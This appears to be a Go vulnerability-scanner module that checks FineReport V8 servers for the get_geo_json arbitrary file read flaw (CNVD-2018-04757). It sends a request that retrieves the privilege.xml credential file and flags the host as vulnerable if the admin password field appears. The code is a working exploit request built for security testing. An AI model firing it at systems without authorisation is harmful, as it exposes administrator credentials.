package fineReport

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757

func CNVD_2018_04757(u string) bool {
	if req, err := pkg.HttpRequset(u+"/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "fsSystemManagerPassSet") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 帆软任意文件读取漏洞|%s\n", u+"/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"))
			return true
		}
	}
	return false
}
